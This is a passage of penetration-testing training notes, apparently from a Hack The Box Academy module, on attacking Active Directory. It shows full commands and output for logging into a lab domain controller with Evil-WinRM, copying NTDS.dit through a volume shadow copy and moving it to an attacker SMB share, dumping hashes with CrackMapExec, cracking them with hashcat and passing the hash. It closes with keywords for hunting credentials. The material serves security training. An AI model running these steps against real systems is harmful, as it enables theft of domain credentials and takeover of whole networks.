&lt;p&gt;It can be useful to know what might have been left behind by an attack. Knowing this can make our remediation recommendations more impactful and valuable for the client we are working with. On any Windows operating system, an admin can navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Event Viewer&lt;/code&gt; and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.&lt;/p&gt;

&lt;p&gt;Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.&lt;/p&gt;

&lt;hr /&gt;

&lt;h5 id=&quot;capturing-ntdsdit&quot;&gt;Capturing NTDS.dit&lt;/h5&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT Directory Services&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NTDS&lt;/code&gt;) is the directory service used with AD to find &amp;amp; organize network resources. Recall that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NTDS.dit&lt;/code&gt; file is stored at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%systemroot%/ntds&lt;/code&gt; on the domain controllers in a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model&quot;&gt;forest&lt;/a&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dit&lt;/code&gt; stands for &lt;a href=&quot;https://docs.oracle.com/cd/E19901-01/817-7607/dit.html&quot;&gt;directory information tree&lt;/a&gt;. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Attacking SAM&lt;/code&gt; section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.&lt;/p&gt;

&lt;h5 id=&quot;connecting-to-a-dc-with-evil-winrm&quot;&gt;Connecting to a DC with Evil-WinRM&lt;/h5&gt;

&lt;p&gt;We can connect to a target DC using the credentials we captured.&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.129.201.57  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; bwilliamson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;P@55w0rd!&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.&lt;/p&gt;

&lt;h6 id=&quot;checking-local-group-membership&quot;&gt;Checking Local Group Membership&lt;/h6&gt;

&lt;p&gt;Once connected, we can check to see what privileges &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bwilliamson&lt;/code&gt; has. We can start with looking at the local group membership using the command:&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; net localgroup

Aliases &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;DC01

&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Access Control Assistance Operators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Account Operators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Administrators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Allowed RODC Password Replication Group
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Backup Operators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Cert Publishers
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Certificate Service DCOM Access
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Cryptographic Operators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Denied RODC Password Replication Group
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Distributed COM Users
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;DnsAdmins
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Event Log Readers
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Guests
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Hyper-V Administrators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;IIS_IUSRS
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Incoming Forest Trust Builders
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Network Configuration Operators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Performance Log Users
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Performance Monitor Users
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Pre-Windows 2000 Compatible Access
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Print Operators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;RAS and IAS Servers
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;RDS Endpoint Servers
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;RDS Management Servers
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;RDS Remote Access Servers
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Remote Desktop Users
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Remote Management Users
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Replicator
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Server Operators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Storage Replica Administrators
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Terminal Server License Servers
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Users
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Windows Authorization Access Group
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrators group&lt;/code&gt;) or Domain Admin (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Admins group&lt;/code&gt;) (or equivalent) rights. We also will want to check what domain privileges we have.&lt;/p&gt;

&lt;h4 id=&quot;checking-user-account-privileges-including-domain&quot;&gt;Checking User Account Privileges including Domain&lt;/h4&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User&lt;span class=&quot;s1&quot;&gt;&apos;s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.&lt;/p&gt;

&lt;h4 id=&quot;creating-shadow-copy-of-c&quot;&gt;Creating Shadow Copy of C:&lt;/h4&gt;

&lt;p&gt;We can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vssadmin&lt;/code&gt; to create a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service&quot;&gt;Volume Shadow Copy&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VSS&lt;/code&gt;) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read &amp;amp; written to actively without needing to bring a particular application or system down. VSS is used by many different backup &amp;amp; disaster recovery software to perform operations.&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; vssadmin CREATE SHADOW /For&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;C:\&apos;&lt;/span&gt;
    Shadow Copy ID: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;186d5979-2f2b-4afe-8101-9f1111e4cb1a&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    Shadow Copy Volume Name: &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;?&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;LOBALROOT&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolumeShadowCopy2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;copying-ntdsdit-from-the-vss&quot;&gt;Copying NTDS.dit from the VSS&lt;/h4&gt;

&lt;p&gt;We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;*Evil-WinRM* PS C:\NTDS&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;cmd.exe /c copy &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;?&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;LOBALROOT&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolumeShadowCopy2&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TDS&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TDS.dit c:&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TDS&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TDS.dit
&lt;span class=&quot;go&quot;&gt;
        1 file(s) copied.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Attacking SAM&lt;/code&gt; section to review that method if needed.&lt;/p&gt;

&lt;h4 id=&quot;transferring-ntdsdit-to-attack-host&quot;&gt;Transferring NTDS.dit to Attack Host&lt;/h4&gt;

&lt;p&gt;Now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe /c move&lt;/code&gt; can be used to move the file from the target DC to the share on our attack host.&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TDS&amp;gt; cmd.exe /c move C:&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TDS&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TDS.dit &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.15.30&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;ompData 

        1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; moved.		
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;a-faster-method-using-cme-to-capture-ntdsdit&quot;&gt;A Faster Method: Using cme to Capture NTDS.dit&lt;/h4&gt;

&lt;p&gt;Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.&lt;/p&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;crackmapexec smb 10.129.201.57 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; bwilliamson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; P@55w0rd! &lt;span class=&quot;nt&quot;&gt;--ntds&lt;/span&gt;

SMB         10.129.201.57    445     DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:inlanefrieght.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.129.201.57    445     DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:P@55w0rd! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.129.201.57    445     DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Dumping the NTDS, this could take a &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445     DC01           DC01&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;im:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
SMB         10.129.201.57    445     DC01           WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
SMB         10.129.201.57    445     DC01           WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
SMB         10.129.201.57    445     DC01           WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
SMB         10.129.201.57    445     DC01           WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
SMB         10.129.201.57    445     DC01           WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;williamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;burgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;stevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;johnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
SMB         10.129.201.57    445     DC01           Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
SMB         10.129.201.57    445     DC01           Administrator:des-cbc-md5:618c1c5ef780cde3
SMB         10.129.201.57    445     DC01           DC01&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
SMB         10.129.201.57    445     DC01           DC01&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
SMB         10.129.201.57    445     DC01           DC01&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;des-cbc-md5:a2852362e50eae92
SMB         10.129.201.57    445     DC01           krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
SMB         10.129.201.57    445     DC01           krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
SMB         10.129.201.57    445     DC01           krbtgt:des-cbc-md5:9bd5017fdcea8fae
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;im:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;im:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
SMB         10.129.201.57    445     DC01           inlanefrieght.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;im:des-cbc-md5:79ab08755b32dfb6
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;cracking-hashes--gaining-credentials&quot;&gt;Cracking Hashes &amp;amp; Gaining Credentials&lt;/h2&gt;

&lt;p&gt;We can proceed with creating a text file containing all the NT hashes, or we can individually copy &amp;amp; paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.&lt;/p&gt;

&lt;h4 id=&quot;cracking-a-single-hash-with-hashcat&quot;&gt;Cracking a Single Hash with Hashcat&lt;/h4&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In many of the techniques we have covered so far, we have had success in cracking hashes we’ve obtained.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What if we are unsuccessful in cracking a hash?&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;pass-the-hash-considerations&quot;&gt;Pass-the-Hash Considerations&lt;/h2&gt;

&lt;p&gt;We can still use hashes to attempt to authenticate with a system using a type of attack called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pass-the-Hash&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PtH&lt;/code&gt;). A PtH attack takes advantage of the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials&quot;&gt;NTLM authentication protocol&lt;/a&gt; to authenticate a user using a password hash. Instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clear-text password&lt;/code&gt; as the format for login, we can instead use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password hash&lt;/code&gt;. Here is an example of how this would work:&lt;/p&gt;

&lt;h4 id=&quot;pass-the-hash-with-evil-winrm-example&quot;&gt;Pass-the-Hash with Evil-WinRM Example&lt;/h4&gt;

&lt;p&gt;Attacking Active Directory &amp;amp; NTDS.dit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.129.201.57  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;  Administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;64f12cddaa88057e06a81b54e73b949b&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on PtH will be covered in the module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AD Enumeration and Attacks&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;credential-hunting-in-windows&quot;&gt;Credential Hunting in Windows&lt;/h1&gt;

&lt;p&gt;Once we have access to a target Windows machine through the GUI or CLI, we can significantly benefit from incorporating credential hunting into our approach. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Credential Hunting&lt;/code&gt; is the process of performing detailed searches across the file system and through various applications to discover credentials. To understand this concept, let’s place ourselves in a scenario. We have gained access to an IT admin’s Windows 10 workstation through RDP.&lt;/p&gt;

&lt;h5 id=&quot;search-centric&quot;&gt;Search Centric&lt;/h5&gt;

&lt;p&gt;Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin’s workstation.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What might an IT admin be doing on a day-to-day basis &amp;amp; which of those tasks may require credentials?&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can use this question &amp;amp; consideration to refine our search to reduce the need for random guessing as much as possible.&lt;/p&gt;

&lt;h6 id=&quot;key-terms-to-search&quot;&gt;Key Terms to Search&lt;/h6&gt;

&lt;p&gt;Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Passwords&lt;/td&gt;
      &lt;td&gt;Passphrases&lt;/td&gt;
      &lt;td&gt;Keys&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Username&lt;/td&gt;
      &lt;td&gt;User account&lt;/td&gt;
      &lt;td&gt;Creds&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Users&lt;/td&gt;
      &lt;td&gt;Passkeys&lt;/td&gt;
      &lt;td&gt;Passphrases&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;configuration&lt;/td&gt;
      &lt;td&gt;dbcredential&lt;/td&gt;
      &lt;td&gt;dbpassword&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;pwd&lt;/td&gt;
      &lt;td&gt;Login&lt;/td&gt;
      &lt;td&gt;Credentials&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Let’s use some of these key terms to search on the IT admin’s workstation.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;search-tools&quot;&gt;Search Tools&lt;/h2&gt;

&lt;p&gt;With access to the GUI, it is worth attempting to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Search&lt;/code&gt; to find files on the target using some of the keywords mentioned above.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/WindowsSearch.png&quot; alt=&quot;Windows search for &apos;pass&apos; showing &apos;Change your password&apos; in system settings and related options.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By default, it will search various OS settings and the file system for files &amp;amp; applications containing the key term entered in the search bar.&lt;/p&gt;

